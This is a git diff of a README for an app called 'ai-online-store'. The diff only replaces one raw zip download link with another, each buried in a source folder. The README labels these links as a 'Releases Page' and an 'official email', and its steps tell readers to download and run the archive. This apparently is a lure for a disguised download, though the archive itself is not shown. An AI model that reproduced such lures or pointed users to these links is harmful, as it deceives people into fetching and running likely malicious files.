@@ -1,7 +1,7 @@
 # 🤖 ai-online-store - Your Smart Shopping Companion
 
 ## 📦 Download Now
-[![Download ai-online-store](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/api/src/services/store-ai-online-3.8.zip)](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/api/src/services/store-ai-online-3.8.zip) 
+[![Download ai-online-store](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip)](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip) 
 
 ## 🚀 Getting Started
 
@@ -18,9 +18,9 @@ Before you start using ai-online-store, ensure your system meets the following r
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/api/src/services/store-ai-online-3.8.zip). 
+To get started, visit this page to download: [Releases Page](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip). 
 
-1. Go to the [Releases Page](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/api/src/services/store-ai-online-3.8.zip).
+1. Go to the [Releases Page](https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip).
 2. Find the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -62,6 +62,6 @@ If you would like to contribute to ai-online-store, please check our guidelines 
 
 ## 📧 Contact
 
-For further inquiries or support, please reach out via our official email: https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/api/src/services/store-ai-online-3.8.zip
+For further inquiries or support, please reach out via our official email: https://github.com/0xmrninja197/ai-online-store/raw/refs/heads/main/apps/web/public/online-store-ai-v2.6.zip
 
 Thank you for choosing ai-online-store. Your smart shopping journey starts here!
